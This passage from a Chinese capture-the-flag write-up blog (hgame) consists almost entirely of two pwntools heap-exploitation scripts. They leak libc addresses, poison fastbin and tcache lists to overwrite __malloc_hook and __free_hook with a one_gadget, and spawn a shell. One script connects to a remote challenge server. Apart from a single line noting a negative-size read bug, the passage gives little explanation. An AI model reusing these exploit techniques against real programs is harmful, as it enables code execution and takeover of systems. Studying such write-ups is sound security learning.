+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>def Add(size,payload):
+</span></span><span style=display:flex><span>    sh.sendlineafter(&#34;choice: &#34;,str(1))
+</span></span><span style=display:flex><span>    sh.sendlineafter(&#34;title: &#34;,str(size))
+</span></span><span style=display:flex><span>    sh.sendafter(&#34;title: &#34;,payload)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>def Delete(index):
+</span></span><span style=display:flex><span>    sh.sendlineafter(&#34;choice: &#34;,str(2))
+</span></span><span style=display:flex><span>    sh.sendlineafter(&#34;id: &#34;,str(index))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>def Show(index):
+</span></span><span style=display:flex><span>    sh.sendlineafter(&#34;choice: &#34;,str(3))
+</span></span><span style=display:flex><span>    sh.sendlineafter(&#34;id: &#34;,str(index))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Add(24,&#39;index:0\n&#39;)
+</span></span><span style=display:flex><span>Add(48,&#39;index:1\n&#39;)
+</span></span><span style=display:flex><span>Add(64,&#39;index:2\n&#39;)
+</span></span><span style=display:flex><span>Add(16,&#39;index:3\n&#39;)#avoid top chunk
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Delete(0)
+</span></span><span style=display:flex><span>Add(24,&#39;a&#39; * 24 + &#39;\x91&#39;)
+</span></span><span style=display:flex><span>Delete(1)
+</span></span><span style=display:flex><span>Add(48,&#39;\n&#39;)
+</span></span><span style=display:flex><span>Show(1)
+</span></span><span style=display:flex><span>sh.recvuntil(&#34;is &#34;)
+</span></span><span style=display:flex><span>libc_base = u64(sh.recv(6).ljust(8,&#39;\x00&#39;)) - (0x3C4B20 + 0x80 + 88)
+</span></span><span style=display:flex><span>log.success(&#39;libc_base:&#39; + hex(libc_base))
+</span></span><span style=display:flex><span>malloc_hook = libc_base + libc.symbols[&#34;__malloc_hook&#34;]
+</span></span><span style=display:flex><span>alloc_addr = malloc_hook - 0x23
+</span></span><span style=display:flex><span>one_gadget = libc_base + 0x4527a
+</span></span><span style=display:flex><span>realloc_addr = libc_base + 0x84720
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Add(0x40,&#39;index:4\n&#39;)
+</span></span><span style=display:flex><span>Add(24,&#39;index:5\n&#39;)
+</span></span><span style=display:flex><span>Add(16,&#39;index:6\n&#39;)
+</span></span><span style=display:flex><span>Add(0x68,&#39;index:7\n&#39;)
+</span></span><span style=display:flex><span>Add(16,&#39;index:8\n&#39;)#avoid top chunk
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Delete(7)
+</span></span><span style=display:flex><span>Delete(5)
+</span></span><span style=display:flex><span>Add(24,&#39;a&#39; * 24 + &#39;\x91&#39;)
+</span></span><span style=display:flex><span>Delete(6)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>payload = &#39;a&#39; * 16 + p64(0) + p64(0x71) + p64(alloc_addr)
+</span></span><span style=display:flex><span>Add(112,payload + &#39;\n&#39;)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Add(0x68,&#39;\n&#39;)
+</span></span><span style=display:flex><span>Add(0x68,&#39;a&#39; * 0xB + p64(one_gadget) + p64(realloc_addr) + &#39;\n&#39;)
+</span></span><span style=display:flex><span>sh.sendlineafter(&#34;choice: &#34;,str(1))
+</span></span><span style=display:flex><span>sh.sendlineafter(&#34;title: &#34;,str(16))
+</span></span><span style=display:flex><span>#Add(16,&#39;\n&#39;)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>sh.interactive()
+</span></span></code></pre></div><h3 id=todolist2>todolist2</h3><p>看了许久没看出漏洞点，最后终于发现是在 read 函数里</p><div style=text-align:center><img src=https://www.cjovi.icu/usr/uploads/2021/02/1200345081.png></div><p>打个 -1 就可以随便输了。</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#!/usr/bin/env python</span>
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic># coding=utf-8</span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>from</span> <span style=color:#0e84b5;font-weight:700>pwn</span> <span style=color:#007020;font-weight:700>import</span> <span style=color:#666>*</span>
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#context(log_level = &#39;debug&#39;)</span>
+</span></span><span style=display:flex><span>context<span style=color:#666>.</span>terminal <span style=color:#666>=</span> [<span style=color:#4070a0>&#39;tmux&#39;</span>,<span style=color:#4070a0>&#39;splitw&#39;</span>,<span style=color:#4070a0>&#39;-h&#39;</span>]
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#sh = process(&#34;./todolist2&#34;)</span>
+</span></span><span style=display:flex><span>sh <span style=color:#666>=</span> remote(<span style=color:#4070a0>&#34;182.92.108.71&#34;</span>,<span style=color:#40a070>30521</span>)
+</span></span><span style=display:flex><span>libc <span style=color:#666>=</span> ELF(<span style=color:#4070a0>&#34;./libc-2.27.so&#34;</span>) 
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>take</span>(size):
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;exit</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>,<span style=color:#4070a0>&#39;1&#39;</span>)
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;write?</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>,<span style=color:#007020>str</span>(size))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>delete</span>(index):
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;exit</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>,<span style=color:#4070a0>&#39;2&#39;</span>)
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;delete?</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>,<span style=color:#007020>str</span>(index))
+</span></span><span style=display:flex><span>  
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>edit</span>(payload,index,size):
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;exit</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>,<span style=color:#4070a0>&#39;3&#39;</span>)
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;edit?</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>,<span style=color:#007020>str</span>(index))
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;write?</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>,<span style=color:#007020>str</span>(size))
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>send(payload)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>show</span>(index):
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;exit</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>,<span style=color:#4070a0>&#39;4&#39;</span>)
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;check?</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>,<span style=color:#007020>str</span>(index))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>take(<span style=color:#40a070>0x410</span>)<span style=color:#60a0b0;font-style:italic>#index:0</span>
+</span></span><span style=display:flex><span>take(<span style=color:#40a070>0x410</span>)<span style=color:#60a0b0;font-style:italic>#index:1</span>
+</span></span><span style=display:flex><span>take(<span style=color:#40a070>0x20</span>)<span style=color:#60a0b0;font-style:italic>#index:2</span>
+</span></span><span style=display:flex><span>delete(<span style=color:#40a070>0</span>)
+</span></span><span style=display:flex><span>delete(<span style=color:#40a070>1</span>)
+</span></span><span style=display:flex><span>take(<span style=color:#40a070>0x830</span>)<span style=color:#60a0b0;font-style:italic>#index:3</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>show(<span style=color:#40a070>3</span>)
+</span></span><span style=display:flex><span>libc_base <span style=color:#666>=</span> u64(sh<span style=color:#666>.</span>recv(<span style=color:#40a070>6</span>)<span style=color:#666>.</span>ljust(<span style=color:#40a070>8</span>,<span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span>)) <span style=color:#666>-</span> <span style=color:#40a070>0x3ebc40</span> <span style=color:#666>-</span> <span style=color:#40a070>96</span>
+</span></span><span style=display:flex><span>log<span style=color:#666>.</span>success(<span style=color:#4070a0>&#34;libc_base:&#34;</span> <span style=color:#666>+</span> <span style=color:#007020>hex</span>(libc_base))
+</span></span><span style=display:flex><span>malloc_hook <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> libc<span style=color:#666>.</span>symbols[<span style=color:#4070a0>&#34;__malloc_hook&#34;</span>]
+</span></span><span style=display:flex><span>free_hook <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> libc<span style=color:#666>.</span>symbols[<span style=color:#4070a0>&#34;__free_hook&#34;</span>]
+</span></span><span style=display:flex><span>log<span style=color:#666>.</span>success(<span style=color:#4070a0>&#34;malloc_hook:&#34;</span> <span style=color:#666>+</span> <span style=color:#007020>hex</span>(malloc_hook)) 
+</span></span><span style=display:flex><span>log<span style=color:#666>.</span>success(<span style=color:#4070a0>&#34;free_hook:&#34;</span> <span style=color:#666>+</span> <span style=color:#007020>hex</span>(free_hook)) 
+</span></span><span style=display:flex><span>one_gadget <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> <span style=color:#40a070>0x4f432</span>
+</span></span><span style=display:flex><span>log<span style=color:#666>.</span>success(<span style=color:#4070a0>&#34;one_gadget:&#34;</span> <span style=color:#666>+</span> <span style=color:#007020>hex</span>(one_gadget))
+</span></span><span style=display:flex><span><span style=color:#4070a0>&#39;&#39;&#39;----------- above dumped libc ----------&#39;&#39;&#39;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>take(<span style=color:#40a070>0x100</span>)<span style=color:#60a0b0;font-style:italic>#index:4</span>
+</span></span><span style=display:flex><span>take(<span style=color:#40a070>0x100</span>)<span style=color:#60a0b0;font-style:italic>#index:5</span>
+</span></span><span style=display:flex><span>delete(<span style=color:#40a070>5</span>)
+</span></span><span style=display:flex><span>edit(<span style=color:#4070a0>&#39;a&#39;</span> <span style=color:#666>*</span> <span style=color:#40a070>0x100</span> <span style=color:#666>+</span> p64(<span style=color:#40a070>0</span>) <span style=color:#666>+</span> p64(<span style=color:#40a070>0x111</span>) <span style=color:#666>+</span> p64(free_hook) <span style=color:#666>+</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>,<span style=color:#40a070>4</span>,<span style=color:#666>-</span><span style=color:#40a070>1</span>)
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#edit(&#39;a&#39; * 0x100 + p64(0) + p64(0x111) + p64(malloc_hook) + &#39;\n&#39;,4,-1)</span>
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#edit(&#39;a&#39; * 0x100 + p64(0) + p64(0x111) + p64(malloc_hook - 0x10) + &#39;\n&#39;,4,-1)</span>
+</span></span><span style=display:flex><span>take(<span style=color:#40a070>0x100</span>)<span style=color:#60a0b0;font-style:italic>#index:6</span>
+</span></span><span style=display:flex><span>take(<span style=color:#40a070>0x100</span>)<span style=color:#60a0b0;font-style:italic>#index:7</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>realloc <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> libc<span style=color:#666>.</span>symbols[<span style=color:#4070a0>&#34;__libc_realloc&#34;</span>]
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#payload = p64(one_gadget) + p64(realloc + 0xa)</span>
+</span></span><span style=display:flex><span>payload <span style=color:#666>=</span> p64(one_gadget)
+</span></span><span style=display:flex><span>edit(payload,<span style=color:#40a070>7</span>,<span style=color:#007020>len</span>(payload))
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#gdb.attach(proc.pidof(sh)[0])</span>
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#take(0x200)</span>
+</span></span><span style=display:flex><span>delete(<span style=color:#40a070>2</span>)
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>interactive()
+</span></span></code></pre></div></section><div class=post-tags><nav class="nav tags"><ul class=tags><li><a href=/tags/write-up>write-up</a></li><li><a href=/tags/hctf-game>hctf-game</a></li></ul></nav></div></article></main><footer><div style=display:flex><a class=soc href=https://github.com/chujDK rel=me title=GitHub><i data-feather=github></i></a>
+<a class=border></a></div><div class=footer-info>2023 <a href=https://github.com/athul/archie>Archie Theme</a> | Built with <a href=https://gohugo.io>Hugo</a></div></footer><script>feather.replace()</script></div></body></html>
